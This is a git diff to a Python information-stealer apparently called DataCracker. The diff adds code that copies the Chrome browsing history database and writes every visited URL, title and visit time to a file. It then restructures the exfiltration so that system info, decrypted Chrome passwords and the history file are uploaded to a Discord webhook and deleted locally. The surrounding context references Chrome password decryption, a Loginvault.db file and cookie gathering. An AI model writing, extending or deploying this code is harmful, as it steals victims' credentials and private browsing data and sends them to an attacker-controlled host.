@@ -1,7 +1,7 @@
 import discord
 import discord_webhook
 import subprocess
-from datetime import datetime
+from datetime import datetime, timedelta
 import requests
 import platform
 import socket
@@ -21,6 +21,7 @@ import shutil
 import csv
 import secret
 from secret import webhookurl
+import os
 # print("Started")
 
 wurl = webhookurl
@@ -203,6 +204,8 @@ except:
 # --------------------------------------------------------------------------------------------------------------------------------------------------
 # --------------------------------------------------------------------------------------------------------------------------------------------------
 # --------------------------------------------------------------------------------------------------------------------------------------------------
+# Chrome Passwords
+
 
 # GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(
@@ -345,6 +348,77 @@ except Exception as e:
 # --------------------------------------------------------------------------------------------------------------------------------------------------
 # --------------------------------------------------------------------------------------------------------------------------------------------------
 # --------------------------------------------------------------------------------------------------------------------------------------------------
+# Chrome Search History
+
+try:
+    chrome_history_path = os.path.expanduser(
+        '~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
+
+    # Create a copy of the Chrome history database to avoid locking issues
+    temp_history_path = 'temp_history'
+    shutil.copyfile(chrome_history_path, temp_history_path)
+
+    # Connect to the Chrome history database
+    conn = sqlite3.connect(temp_history_path)
+    cursor = conn.cursor()
+
+    # Execute a query to retrieve the browsing history
+    cursor.execute(
+        "SELECT title, url, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
+
+    # Create and open a text file for writing
+    output_file = open('chrome_history.txt', 'w', encoding='utf-8')
+
+    # Add header and separator lines to the text file
+    output_file.write(
+        "------------------------------------------------------------------------------------------------------------------------------------\n")
+    output_file.write(
+        "                                              Chrome Search History\n")
+    output_file.write(
+        "------------------------------------------------------------------------------------------------------------------------------------\n\n")
+
+    # Fetch and write the results to the text file
+    results = cursor.fetchall()
+    for row in results:
+        title, url, visit_count, last_visit_time = row
+        formatted_time2 = datetime(1601, 1, 1) + \
+            timedelta(microseconds=last_visit_time)
+
+        output_file.write(f"Title: {title}\n")
+        output_file.write(f"URL: {url}\n")
+        output_file.write(f"Visit Count: {visit_count}\n")
+        output_file.write(
+            f"Last Visit Time: {formatted_time2.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+
+    # Close the text file
+    output_file.close()
+
+    # Close the database connection
+    conn.close()
+
+    # Clean up the temporary copy of the Chrome history database
+    os.remove(temp_history_path)
+    gotchromehistory = True
+except:
+    gotchromehistory = False
+
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 try:
@@ -362,6 +436,9 @@ try:
             f.write(format_table_row("Got SYSTEM-INFO", gotsysteminfo) + "\n")
             f.write(format_table_row(
                 "Successfully asked for Cookies", askedforcookies) + "\n")
+            f.write(format_table_row("Got Chrome Passwords", gotpw) + "\n")
+            f.write(format_table_row(
+                "Got Chrome Search History", gotchromehistory) + "\n")
         except:
             f.write("Couldn't gather Info over Checks.\n\n")
 
@@ -483,13 +560,18 @@ try:
                         "name": "Got Chrome Passwords",
                         "value": gotpw,
                         "inline": True
+                    },
+                    {
+                        "name": "Got Chrome Search History",
+                        "value": gotchromehistory,
+                        "inline": True
                     }
                 ],
                 "author": {
                     "name": "By LennyMaxMine - DataCracker"
                 },
                 "footer": {
-                    "text": "On: " + formatted_time
+                    "text": "On: " + str(formatted_time)
                 }
             },
         ],
@@ -507,8 +589,8 @@ except Exception as e:
     print("Fehler beim Ausführen des Codes (Webhook):", str(e))
 
 
-try:
-    def send_file_to_discord_webhook(webhook_url, file_path):
+def send_file_to_discord_webhook(webhook_url, file_path):
+    try:
         with open(file_path, 'rb') as file:
             payload = {
                 'file': file
@@ -519,46 +601,35 @@ try:
         # print('File sent successfully.')
         # else:
         # print('Failed to send the file. Status code:', response.status_code)
-
-    # Replace 'WEBHOOK_URL' with your Discord webhook URL
-    webhook_url = wurl
-
-    # Replace 'FILE_PATH' with the path to the file you want to send
-    file_path = f'./{formatted_time}.txt'
-
-    send_file_to_discord_webhook(webhook_url, file_path)  # , file_path2)
-
-    os.remove(file_path)
-except:
-    file_path = f'./{formatted_time}.txt'
-    os.remove(file_path)
+        os.remove(file_path)
+    except:
+        os.remove(file_path)
 
 
 try:
-    def send_file_to_discord_webhook(webhook_url, file_path):
-        with open(file_path, 'rb') as file:
-            payload = {
-                'file': file
-            }
-            response = requests.post(webhook_url, files=payload)
-
-        # if response.status_code == 200:
-        # print('File sent successfully.')
-        # else:
-        # print('Failed to send the file. Status code:', response.status_code)
-
-    # Replace 'WEBHOOK_URL' with your Discord webhook URL
     webhook_url = wurl
-
-    # Replace 'FILE_PATH' with the path to the file you want to send
-    file_path2 = f'./passwords.txt'
-
-    send_file_to_discord_webhook(webhook_url, file_path2)
-
-    os.remove(file_path2)
+    file_path = f'./{formatted_time}.txt'
+    send_file_to_discord_webhook(webhook_url, file_path)
 except:
-    file_path2 = f'./passwords.txt'
-    os.remove(file_path2)
+    None
+
+try:
+    webhook_url = wurl
+    file_path = f'./passwords.txt'
+    send_file_to_discord_webhook(webhook_url, file_path)
+except:
+    None
+
+try:
+    webhook_url = wurl
+    file_path = f'./chrome_history.txt'
+    send_file_to_discord_webhook(webhook_url, file_path)
+except:
+    None
+
+
+# -----------------------------
+
 
 try:
     database = f'./Loginvault.db'
